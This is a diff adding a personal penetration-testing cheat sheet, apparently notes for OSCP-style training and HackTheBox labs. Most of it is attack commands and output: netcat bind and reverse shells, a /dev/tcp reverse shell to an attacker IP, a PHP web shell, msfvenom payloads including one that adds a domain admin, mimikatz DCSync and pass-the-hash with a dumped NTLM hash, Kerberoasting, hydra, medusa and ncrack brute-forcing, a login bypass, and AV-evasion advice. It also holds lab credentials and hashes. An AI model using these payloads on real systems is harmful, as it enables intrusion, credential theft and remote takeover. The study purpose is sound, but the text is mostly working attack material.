@@ -1,0 +1,515 @@
+
+
+// netcat
+# nc -lvp 9422 < LinEnum.sh     // as server to push the file 
+# nc -nv 10.10.10.10 9422 > LinEnum.sh     // as client to get the file 
+
+// Netcat Bind Shell Scenario 
+# nc -nlvp 4444 -e cmd.exe    // on server 
+root@kali:~# nc -nv 10.0.0.22 4444.  // on client  (UNKNOWN) [10.0.0.22] 4444 (?) open Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. 
+C:\Users\client>ipconfig 
+// revers shell on netcat 
+C:\Users\client>nc -nlvp 4444   // on client 
+listening on [any] 4444 ... 
+root@kali:~# nc -nv 10.0.0.22 4444 -e /bin/bash    // on server 
+(UNKNOWN) [10.0.0.22] 4444 (?) open 
+// then , on the client side, windows cmd will receive a bash shell 
+
+//scp 
+root@kali:~# scp coronavirus.jpg root@192.168.1.228:/var/www/html/img/     // get file from target server 
+root@192.168.1.228's password: 
+coronavirus.jpg 	
+
+// copy net cat to local
+# scp root@10.10.14.95:/bk/nc.exe .
+
+// ncat.  ,  ssl transfer , secure connection
+
+# ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl    // server
+root@kali:~# ncat -v 10.0.0.22 4444 --ssl      // client 
+
+//  create http service by small python 
+root@kali:/tmp# python -m SimpleHTTPServer 80
+
+// Wireshark #65 
+
+// TCPDump   #71
+
+// Google Hacking Database  |  https://www.exploit-db.com/google-hacking-database
+
+// Email Harvest
+root@kali:/tmp# theharvester -d it.weltec.ac.nz -b google
+root@kali:/tmp# theharvester -d it.weltec.ac.nz -b bing
+
+// Search Engine bar:   http://www.searchengineshowdown.com/features/
+
+// web server + DNS search :  https://searchdns.netcraft.com/
+
+//web scan
+root@kali:/bk# nikto -p 80 -h 10.10.10.184
+
+// Whois is a name for a TCP service, a tool, and a type of database. 
+root@kali:~# whois xxxx.com
+
+// recon-ng is information gathering tool , usage like metasploit.
+root@kali:/tmp# recon-ng 
+[recon-ng][default] > marketplace search hackertarget
+[recon-ng][default] > marketplace install recon/domains-hosts/hackertarget
+[*] Module installed: recon/domains-hosts/hackertarget
+[*] Reloading modules...
+[recon-ng][default] > modules load recon/domains-hosts/hackertarget
+[recon-ng][default][hackertarget] > options set SOURCE weltec.ac.nz
+SOURCE => weltec.ac.nz
+[recon-ng][default][hackertarget] > run
+------------
+WELTEC.AC.NZ
+------------
+[*] [host] weltec.ac.nz (103.28.250.103)
+[*] [host] webcon01.weltec.ac.nz (156.59.96.34)
+[*] [host] rp01.weltec.ac.nz (156.59.96.32)
+[*] [host] access01.weltec.ac.nz (156.59.96.33)
+[*] [host] av01.weltec.ac.nz (156.59.96.35)
+
+//Enumeration info
+https://github.com/theonlykernel/enumeration/wiki
+
+// DNS Enumeration 
+
+root@kali:~# host -t ns megacorpone.com megacorpone.com name server ns2.megacorpone.com. 
+megacorpone.com name server ns1.megacorpone.com. 
+megacorpone.com name server ns3.megacorpone.com. 
+root@kali:~# host -t mx megacorpone.com megacorpone.com mail is handled by 60 mail.megacorpone.com. 
+megacorpone.com mail is handled by 50 mail2.megacorpone.com. 
+
+
+// DNS Zone Transfers   #99
+// host -l <domain name> <dns server address> 
+root@kali:~# host -l megacorpone.com ns2.megacorpone.com 
+
+####### bash #######
+
+#!/bin/bash # Simple Zone Transfer Bash Script # $1 is the first argument given after the bash script # Check if argument was given, if not, print usage if [ -z "$1" ]; then echo "[*] Simple Zone transfer script" echo "[*] Usage : $0 <domain name> " exit 0 fi 
+# if argument was given, identify the DNS servers for the domain 
+for server in $(host -t ns $1 |cut -d" " -f4);do 
+# For each of these servers, attempt a zone transfer 
+host -l $1 $server |grep "has address" 
+done
+
+########################### 
+
+root@kali:/tmp# bash dnszt.sh weltec.ac.nz
+
+// dnsrecon and dnsenum are all good for dns check
+root@kali:~# dnsrecon -d megacorpone.com -t axfr 
+root@kali:~# dnsenum zonetransfer.me 
+
+// Port Scanning 
+
+// TCP - This mechanism is designed so that two hosts attempting to communicate can negotiate the parameters of the network TCP socket connection before transmitting data. Connect port scanning involves attempting to complete a three-way handshake with the target host on the specified port(s). If the handshake is completed, this indicates that the port is open
+
+// UDP - An empty UDP packet is sent to a specific port. If the UDP port is open, no reply is sent back from the target machine. If the UDP port is closed, an ICMP port unreachable packet should be sent back from the target machine. 
+
+// rpcclient- rpcclient is a utility initially developed to test MS-RPC functionality in Samba itself. It has undergone several stages of development and stability. Many system administrators have now written scripts around it to manage Windows NT clients from their UNIX workstation.
+[root@kali /bk ]# rpcclient < server >
+
+// Nmap
+# nmap -A -T4 -p- 192.168.1.232     // just do not launch full port scan if that must
+# nmap -sn 192.168.1.0/24
+# nmap -sP -PI -PY 192.168.1.0/24
+# nmap -O 10.0.0.19 # nmap 10.0.0.19 --script smb-os-discovery.nse     // All NSE scripts can be found in the /usr/share/nmap/scripts directory 
+# nmap --script=dns-zone-transfer -p 53 ns2.xxxx.com 
+# nmap -n -sV -script "*ftp*" -p 21 10.10.10.184
+# nmap -n -sV -script "*ssh*" -p 22 10.10.10.184
+# nmap -n -sV -script "*http*" -p 80 10.10.10.184
+# nmap -n -sV -script "ldap*" -p 389 10.10.10.175
+https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetADUsers.py
+# python GetADUsers.py EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175 -all
+// for how to use GetNPUsers.py to get the hash
+# python GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile 175.txt -outputfile 175.hash -dc-ip 10.10.10.175
+// request token
+# python GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
+// AD account login from psexec.py
+# python psexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
+// LDAP search
+# ldapsearch -x -h 10.10.10.182 -s sub -b 'dc=cascade,dc=local'
+
+// dir scan
+root@kali:/bk# dirb http://10.10.10.176/ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -w
+
+// use wfuzz to scan the site 
+root@kali:/bk# wfuzz -c -z file,common.txt -u http://10.10.10.176/FUZZ | grep -v "404"
+# wfuzz -w /usr/share/wordlists/wfuzz/general/big.txt -u http://10.10.10.6/FUZZ --hc 404
+
+//gobuster
+[root@kali /bk ]# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.56 -k
+[root@kali /bk ]# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.56 -k -t 100
+[root@kali /bk ]# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.56/cgi-bin/ -k -x php,sh,py,html
+
+// Vhost check
+[root@kali /bk ]# gobuster vhost -w /usr/share/wordlists/dirb/common.txt -u http://forwardslash.htb | grep -v "400"
+
+// SMB Enumeration 
+# nmap -v -p 139,445 -oG smb.txt 192.168.1.1-254 | grep -v "host down"       // scan internal network
+# nmap -v -p 139,445 192.168.1.1-254 | grep -v "host down"
+
+root@kali:~# nbtscan -r 192.168.1.0/24       // nbtscan is an another option to try
+Doing NBT name scan for addresses from 192.168.1.0/24
+IP address       NetBIOS Name     Server    User             MAC address      
+------------------------------------------------------------------------------
+192.168.1.0	Sendto failed: Permission denied
+192.168.1.113    MACBOOKAIR-C33A            <unknown>        14:c2:13:13:c3:3a
+192.168.1.38     HM-THINKPAD      <server>  <unknown>        e4:b3:18:84:a4:0e
+192.168.1.232    <unknown>                  <unknown>        
+192.168.1.231    SIFTWORKSTATION  <server>  SIFTWORKSTATION  00:00:00:00:00:00
+192.168.1.237    HM-W2K8VM        <server>  <unknown>        08:00:27:df:7e:08
+192.168.1.127    WIN10            <server>  <unknown>        00:0c:29:7c:37:12
+192.168.1.177    BRW802BF94A2595  <server>  <unknown>        80:2b:f9:4a:25:95
+192.168.1.255	Sendto failed: Permission denied
+
+// enum4linux usage for check smb protocol under windows system
+root@kali:~# enum4linux -a 192.168.1.223
+
+// show mount
+root@kali:~# showmount -e 10.10.10.180
+root@kali:/bk# mount -t nfs 10.10.10.180:/site_backups nfs/
+
+// use hydra to test smb
+root@kali:/bk# hydra -L 169.username.txt -p Welcome123! smb://10.10.10.169
+
+// bruteforce with hydra on http web
+// first, post a password from fox on this page :https://nineveh.htb/db/index.php
+// Second, go to burpsuit to check the history recorders
+// confirm this is https
+// copy POST /db/index.php HTTP/1.1 
+// copy  password=password&remember=yes&login=Log+In&proc_login=true 
+// check the response message : Incorrect password.
+// restructure these info into this format by using https-post-form
+// https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password."
+// run the command
+[root@kali /bk ]# hydra -l "" -P /usr/share/wordlists/fasttrack.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password."
+
+// check samba client and how to login
+root@kali:/bk# smbclient -L 10.10.10.169 -U melanie -W MEGABANK
+root@kali:/bk# smbclient -U melanie //10.10.10.169/SYSVOL
+smb: \> recurse on
+
+// evil-winrm is a tool that can use it to connect windows shell
+// https://github.com/Hackplayers/evil-winrm
+root@kali:/bk# gem install evil-winrm
+root@kali:/bk# evil-winrm -i 10.10.10.169 -u melanie -p "Welcome123!"
+
+// use this cmd to check all hidden the files
+C:\Users\melanie> ls -force
+C:\> ls -hidden          //only hidden files
+C:\Users\ryan\Documents> whoami /all
+C:\Users\ryan\Documents> net view \\10.10.14.54
+C:\Users\ryan\Documents> net use P: \\10.10.14.54\BK
+P:\> sc.exe stop dns
+
+// from the kali vm ,download this tool for win-esc
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe
+*Evil-WinRM* PS C:\Users\FSmith\Documents> cp \\10.10.14.54\bk\winPEAS.exe .
+*Evil-WinRM* PS C:\Users\FSmith\Documents> ./winPEAS.exe
+
+// use mimikatz.exe to sync the administrator account to the local
+https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200308-1
+*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> ./mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"
+//Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff         // this is credential ! 
+root@kali:/bk# evil-winrm -i 10.10.10.175 -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff
+
+// SMTP Enumeration  #128
+// simple Python script that opens a TCP socket, connects to the SMTP server, and issues a VRFY command for a given username 
+###################
+
+#!/usr/bin/python import socket import sys if len(sys.argv) != 2: 
+print "Usage: vrfy.py <username>" sys.exit(0) 
+# Create a Socket s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Connect to the Server connect=s.connect(('10.11.1.215',25)) # Receive the banner banner=s.recv(1024) print banner # VRFY a user s.send('VRFY ' + sys.argv[1] + '\r\n') result=s.recv(1024) print result # Close the socket s.close() 
+
+####################
+
+// SNMP Enumeration 
+root@kali:~# nmap -sU --open -p 161 192.168.1.1-254
+
+// Enumerating the Entire MIB Tree   #133
+
+// Vulnerability Scanning   |  Vulnerability scans can generate a great deal of traffic and, in some cases, can even result in denial of service conditions on many network devices, so caution must be exercised before making use of mass vulnerability scanners on a penetration test 
+# nmap -v -p 80 --script=http-vuln-cve2010-2861 192.168.1.xxx
+# nmap -v -p 21 --script=ftp-anon.nse 192.168.1.1-254 
+# nmap -v -p 139,445 --script=smb-security-mode 192.168.1.237         // scan smb security mode
+# nmap -v -p 80 --script=http-vuln-cve2011-3192 192.168.1.1-254    //   use nmap data to verify that all domain web servers have been patched against CVE-2011-319242, an Apache denial of service vulnerability 
+# nmap -vvv -p 22,80 -script "-vuln-* 10.10.10.6
+# nmap -n -sV -script "*ssh*" -p 22 10.10.10.184Â  
+ 
+// The OpenVAS Vulnerability Scanner  | Greenbone interface on web    #139  
+
+// Buffer Overflows     # take time to read again and again
+// Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR)    #147
+
+// Generating Shellcode with Metasploit 
+root@kali:~# msfvenom -l payloads     // generate payloads for the buffer overflows      #172
+root@kali:/bk# msfvenom -p windows/x64/exec cmd='net group "domain admins" melanie /add /domain' --platform windows -f dll > /bk/adm.dll
+root@kali:/bk# msfvenom -p php/meterpreter/bind_tcp lport=9433 -f raw   // php bind shell, need to use Metasploit multi handler and set payload php/meterpreter/bind_tcp
+
+// Linux Buffer Overflow Exploitation   # 173     // read and understand again and again !
+
+// exploit database  can be found below , and be caution to use the resource from internet !
+root@kali:~# searchsploit
+
+// The Exploit Database and SecurityFocus exploit archives are both trustworthy sources of exploits 
+// Never run an exploit without first examining its code, and understanding its inner workings 
+
+// File Transfers  |  anti-virus : One of our favorite ways to avoid antivirus software is to use legitimate administrative tools during the post exploitation phase   | Use  TFTP , FTP, VBscript, powershell, debug  # 250 
+// Privilege Escalation 
+// the process of privilege escalation will involve breaking this security model. 
+// low permission user can run the key service  |  misconfiguration  | system vulnerability  | unprotected files that contain information which could lead to privilege escalation 
+// the secret to success in client side attacks is once again information gathering , Passive and active, Social Engineering 
+// File Inclusion Vulnerabilities   #236
+// Local (LFI) and remote (RFI) file inclusion vulnerabilities are commonly found in poorly written PHP code 
+
+// MySQL SQL Injection  #245
+// A common web vulnerability found in dynamic sites that is caused by unsanitized user input, which is then passed on to a database. 
+root@kali:~# sqlmap -u http://192.168.1.110/wordpress --batch          #264
+root@kali:/bk# sqlmap -u http://10.10.10.175 --crawl=2
+
+// sqlmap for website that need to be authenticated
+root@kali:/bk# sqlmap  -u http://10.10.10.176/books.php --cookie="security=low; PHPSESSID=mgo9tbtntskfl43tnho5c60jtp" --crawl=2
+
+// sql lite
+root@kali:/bk# sqlite3 bolt.db 
+SQLite version 3.31.1 2020-01-27 19:55:54
+Enter ".help" for usage hints.
+sqlite> .database
+main: /bk/bolt.db
+sqlite> .table
+bolt_authtoken    bolt_field_value  bolt_pages        bolt_users      
+bolt_blocks       bolt_homepage     bolt_relations  
+bolt_cron         bolt_log_change   bolt_showcases  
+bolt_entries      bolt_log_system   bolt_taxonomy   
+sqlite> select * from bolt_users;
+1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2020-04-12 07:43:02|10.10.14.44|Admin|["files://shell.php"]|1||||0||["root","everyone"]
+sqlite> 
+
+// Password Attacks   |  the passwords used in our guessing attempts can come from two sources: dictionary files or key-space brute-force 
+
+// Kali Linux includes a number of these dictionary files in the following directory: /usr/share/wordlists/ 
+
+// For example, to create a wordlist containing the characters 0-9 and A-F, we would enter a command similar to the following: 
+root@kali:~# crunch 6 6 0123456789ABCDEF -o crunch1.txt 
+// generate a wordlist using a pre-defined character-set. 
+root@kali:~# crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha 
+
+// Pwdump and Fgdump  for windows xp ,not after xp
+// Windows Credentials Editor (WCE) is a security tool that allows one to perform several attacks to obtain clear text passwords and hashes from a compromised Windows host. 
+
+// Password Profiling  |  This involves using words and phrases taken from the specific organization you are targeting and including them in your wordlists with the aim of improving your chances of finding a valid password. 
+root@kali:~# cewl www.xxxxx.com -m 6 -w pw.txt 
+
+// Password Mutating  |  a few numbers at the end of the password, swapping out lowercase for capital letters, changing certain letters to numbers 
+
+// Online Password Attacks 
+// Hydra, Medusa, and Ncrack  |  these 3 tools，the most popular for performing password security audits 
+# medusa -h 10.11.1.219 -u admin -P password-file.txt -M http -m 
+# medusa -h 10.10.10.182 -U 182user.list -P 182user.list -M smbnt
+
+// The ncrack tool is one of the few tools that is able to brute-force the Windows RDP protocol reliably and quickly 
+root@kali:~# ncrack -vv --user administrator -P rockyou.txt rdp://192.168.1.127
+
+// Hydra an be used to crack a variety of protocol authentication schemes including SNMP ，SSH
+root@kali:~# hydra -P password-file.txt -v 10.11.1.219 snmp root@kali:~# hydra -l root -P password-file.txt 10.11.1.219 ssh 
+// nmap scan rap
+[root@kali /bk ]# nmap -n -sV -script "rdp*" -p 3389 10.10.10.4
+
+// system vuln scan by nmap
+[root@kali /bk ]# nmap -Pn -n -sV -script "vuln" 10.10.10.4
+
+
+// The hidden art behind online brute-force attacks is choosing your targets, user lists, and password files carefully and intelligently before initiating the attack. 
+
+// Password Hash Attacks 
+// dentifying the exact type of hash 
+root@kali:~# hash-identifier 
+
+// John the Ripper     #283
+// hash private key 
+root@kali:~# python /usr/share/john//ssh2john.py joana.rsa > joana.rsa.hash
+root@kali:~# /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt joana.rsa.hash
+
+// hash password in /etc/shadow and /etc/passwd 
+root@kali:/bk# unshadow passwd-171 shadow-171 > 171.hash
+root@kali:/bk# cat 171.hash | grep root > 171.root.hash
+root@kali:/bk# cat 171.root.hash 
+root:$6$BGk6CBPE$FoDCUgY.1pnYDkqDr4.yNm4jQqnnG7side9P6ApdQWWqLr6t1DHq/iXuNF7F0fkivSYXajUp/bK2cw/D/3ubU/:0:0:root:/root:/bin/bash
+root@kali:/bk# john --wordlist=rockyou.txt 171.root.hash 
+
+// Passing the Hash in Windows  |  pth-winexe tool to authenticate using the password hash and gain a remote command prompt on the target machine 
+
+// Port Redirection and Tunneling    | brain fuck！
+// Understanding and mastering these techniques will provide us with the surgical tools needed to manipulate the direction flow of the targeted traffic, which can often be useful in restricted network environments. 
+//  #288
+// SSH Tunneling 
+// Dynamic Port Forwarding  #295 
+// Traffic Encapsulation  |  use an HTTP or SSL encapsulating tool such as HTTPTunnel or stunnel, respectively. These tools usually work in a client/server model, allowing us to encapsulate any protocol within HTTP or SSL, thus fooling the deep packet inspection device into allowing the outbound traffic.   #300
+
+// The Metasploit Framework    |  important to know!
+// An exploit framework is a system that contains development tools geared toward exploit development and usage. The frameworks standardize the exploit usage syntax and provide dynamic shellcode capabilities. This means that for each exploit in the framework, you can choose various shellcode payloads such as a bind shell, a reverse shell, download and execute shellcode, and so forth. 
+
+// Metasploit Database Access     #311
+
+// Meterpreter Payloads  #318
+
+// Building Your Own MSF Module 
+
+// Bypassing Antivirus Software 
+// The process of avoiding antivirus signatures by manually editing the binary file requires a deeper understanding of the PE file structure and assembly programming ， but we have several tools available to us in Kali Linux that can help us get by antivirus software    #334
+// The most foolproof method of bypassing antivirus software protections is to use tools and binaries that are unknown to AV vendors, either by writing your own, or by finding and using unique payloads. 
+
+// Assembling the Pieces: Penetration Test Breakdown 
+# 341 - 375 ( end)  |  a full story for how to intrusion the high value target. 
+
+……..
+// calculate base64 
+[root@kali /bk ]# echo "fTEzAfYDoH6GQFYKp1XY5hm7bjOP86yYxE=" | base64 -d
+
+// in windows, use “ allinfo “ to check the file stream
+smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
+
+
+
+#####################################################################
+
+// Linux Enumerate
+
+// LinPeas.sh
+https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+
+// LinEnum.sh
+https://github.com/rebootuser/LinEnum
+
+// $ ./pspy64
+
+//$ gcc -o logrotten logrotten.c 
+// $ ./logrotten.c
+
+// import Powershell module
+C:\Users\mhope\.Azure> import-module ./Azure-ADConnect.ps1
+
+// Azure AD connect by if the user in the azure admin group
+https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1
+C:\Users\mhope\.Azure> Azure-ADConnect -server 10.10.10.172 -db ADSync
+
+// tty shell
+https://netsec.ws/?p=337
+# python -c 'import pty; pty.spawn("/bin/sh")'
+# python3 -c 'import pty; pty.spawn("/bin/sh")'
+
+// winpeas  , for windows privilege escalation
+https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat
+
+// create mysqldump to priesca
+$ mysqldump -u torrent -p torrenthoster > dump.sql
+
+//wordpress scan , wpscan
+[root@kali /bk ]# wpscan --url http://10.10.10.10 --enumerate
+[root@kali /bk ]# wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate
+[root@iriniu /sh ]# wpscan --url http://10.10.10.88/webservices/wp -e p,t,u
+
+//steghide 
+root@kali /bk ]# steghide extract -sf HackerAccessGranted.jpg
+root@kali:~# steghide embed -cf coronavirus.jpg -ef alex.rsa 
+root@kali:~# lssteghide info coronavirus.jpg 
+root@kali:~# steghide extract -sf coronavirus.jpg 
+// stegcracker
+https://github.com/Paradoxis/StegCracker
+root@kali:~# pip3 install stegcracker
+root@kali:~# stegcracker coronavirus.jpg 
+
+// DNS zone check
+[root@kali /bk ]# host -l bank.htb 10.10.10.29    // 10.10.10.29 must a dns server
+
+// windows escalation suggester
+https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py
+[root@kali /bk ]# python windows-exploit-suggester.py --database 2020-04-23-mssb.xls --systeminfo 8info.txt
+
+//Sherlock.ps1 
+
+// as the python code mostly are running by python3, if you need python2 for exec some module, download source code and do the offline install
+// source code: https://pypi.org
+// how to : [root@kali /bk/xlrd-1.2.0 ]# python setup.py install
+
+// for run php code in kali for payload that you need to install php-curl , then just run # php code.php
+
+// for how to use html request, below is the sample
+[root@kali /bk ]# cat 17.html
+<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
+ Username: <input type="text" name="username" value="administrator">
+<input type="hidden" name="email" value="sth">
+<input type="hidden" name="action" value="loginGuestFacebook">
+<input type="submit" value="Login">
+</form>
+// launch a http server in kali and use fox to open it via http://127.0.0.1/17.html
+
+// telnet to connect pop 110 and check
+http://sunnyoasis.com/services/emailviatelnet.html
+root@kali /bk ]# telnet 10.10.10.51 110
+user mindy
+pass mindy 
+list
+retr 1
++OK Message follows
+
+// plink for port tunnel  ( exec on target)
+c:\Users\Administrator\Desktop>.\plink.exe -l root -pw SNIPER2 -R 9522:127.0.0.1:9522 10.10.14.36
+c:\Users\Administrator\Desktop>.\plink.exe -l root -pw SNIPER2 -R 445:127.0.0.1:445 10.10.14.36
+
+//ssh port tunnel 
+[root@kali /bk ]# ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
+
+// check windows folder permission. edit permission to add read 
+c:\Users\Administrator\Desktop>cacls c:\Users\Administrator\Desktop
+c:\Users\Administrator\Desktop>cacls root.txt /g Alfred:r
+
+// kali to connect windows on smb 
+[root@kali /bk ]# winexe -U administrator //127.0.0.1 "cmd.exe"
+// sample for winexe : winexe -U HOME/Administrator%Pass123 //192.168.0.1  "cmd.exe"
+
+// UNIX system check
+charix@Poison:~ % sockstat
+
+// base64 decode with multi numbers by bash
+#!/bin/bash
+data=$(cat pwd.b64);
+for i in $(seq 1 13);
+do data=$(echo $data | tr -d ' ' | base64 -d); done;
+	 echo $data
+
+// connect to vnc
+kali@kali:~$ xtightvncviewer 127.0.0.1:5901
+
+// PHP hardcode username and password vuln
+// after post admin/admin, we got below post details
+POST /department/login.php HTTP/1.1
+Host: 10.10.10.43
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.43/department/login.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Connection: close
+Cookie: PHPSESSID=t3qr30evvbni3hv07eap8lv4s0
+Upgrade-Insecure-Requests: 1
+username=admin&password=admin
+// after change "  username=admin&password=admin   into username=admin&password[]=admin   that we could bypass the auth and access the panel with admin !!
+
+// simple php call request CMD 
+ <?php system($_REQUEST["cmd"]); ?>
+
+// echo bash codes into the file ,//   \n\n ---> go to another line
+$ echo "#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.36/9522 0>&1" > update.file   
+
+// note here as the linux basic that you can use sudo -u <username> to run the shell under this< user> 
+$ sudo -u scriptmanager ls -lah /scripts/test.py
+
+// use linux exploit suggester ,this tool is focus on kernel check
+https://github.com/mzet-/linux-exploit-suggester
